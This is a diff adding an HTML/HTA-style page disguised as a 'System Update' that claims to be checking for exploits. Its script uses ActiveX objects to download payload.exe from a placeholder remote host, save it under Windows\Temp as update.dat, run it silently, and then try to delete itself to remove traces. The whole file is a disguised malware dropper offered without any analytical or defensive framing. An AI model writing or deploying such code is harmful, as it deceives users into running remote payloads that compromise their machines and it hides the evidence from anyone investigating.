@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update</title>
+</head>
+<body>
+    <h2>Checking for exploits......</h2>
+    <script language="JavaScript">
+        try {
+            // Create the XMLHTTP object to download the file
+            var x = new ActiveXObject("MSXML2.XMLHTTP");
+            x.open("GET", "https://your-project.vercel.app/payload.exe", false);
+            x.send();
+
+            // Create the ADODB.Stream object to save the file
+            var s = new ActiveXObject("ADODB.Stream");
+            s.Open();
+            s.Type = 1; // Binary
+            s.Write(x.responseBody);
+            s.SaveToFile("C:\\Windows\\Temp\\update.dat", 2); // Overwrite if exists
+            s.Close();
+
+            // Execute the downloaded payload
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run("cmd /c start C:\\Windows\\Temp\\update.dat", 0, false);
+            
+            // Optional: Delete the HTA itself to clean up traces
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            fso.DeleteFile(WScript.ScriptFullName);
+
+        } catch (e) {
+            alert("Error: " + e.message);
+        }
+    </script>
+</body>
+</html>
